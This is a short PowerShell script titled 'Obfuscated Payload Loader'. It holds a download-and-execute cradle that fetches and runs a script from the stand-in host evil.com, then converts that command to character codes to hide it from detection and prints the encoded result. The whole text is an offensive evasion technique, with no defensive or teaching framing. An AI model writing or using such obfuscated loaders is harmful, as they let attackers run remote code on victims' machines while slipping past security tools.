# Obfuscated Payload Loader
$payload = 'IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')'
$chars = $payload.ToCharArray() | ForEach-Object { [int][char]$_ }
$obfuscated = $chars -join ' '
Write-Output "Obfuscated:`n$obfuscated"